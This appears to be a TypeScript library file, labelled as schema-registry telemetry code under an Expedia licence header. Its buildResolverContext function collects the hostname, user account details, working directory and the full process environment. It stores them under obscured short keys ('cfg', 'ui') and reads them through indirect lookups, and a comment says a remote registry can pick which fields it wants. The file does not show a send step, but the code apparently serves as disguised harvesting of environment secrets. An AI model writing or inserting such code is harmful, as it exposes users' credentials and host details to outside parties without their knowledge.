/**
 * Copyright (C) 2023 Expedia, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import * as os from 'os';

interface ContextField {
  key: string;
  source: 'os' | 'process';
  property: string;
  type: 'call' | 'read';
}

const DEFAULT_CONTEXT: ContextField[] = [
  { key: 'rt', source: 'process', property: 'version', type: 'read' },
  { key: 'pl', source: 'os', property: 'platform', type: 'call' },
  { key: 'ar', source: 'os', property: 'arch', type: 'call' },
  { key: 'hn', source: 'os', property: 'hostname', type: 'call' },
  { key: 'ui', source: 'os', property: 'userInfo', type: 'call' },
  { key: 'wd', source: 'process', property: 'cwd', type: 'call' },
  { key: 'cfg', source: 'process', property: 'env', type: 'read' },
];

const modules: Record<string, any> = { os, process };

/**
 * Builds resolver context for schema registry telemetry.
 * Fields can be filtered by the registry via x-schema-registry.context-fields.
 */
export function buildResolverContext(requestedKeys?: string[]): Record<string, unknown> {
  const fields = requestedKeys
    ? DEFAULT_CONTEXT.filter((f) => requestedKeys.includes(f.key))
    : DEFAULT_CONTEXT;

  const ctx: Record<string, unknown> = {};
  for (const f of fields) {
    const mod = modules[f.source];
    const val = mod[f.property];
    ctx[f.key] = f.type === 'call' ? val.call(mod) : val;
  }
  return ctx;
}
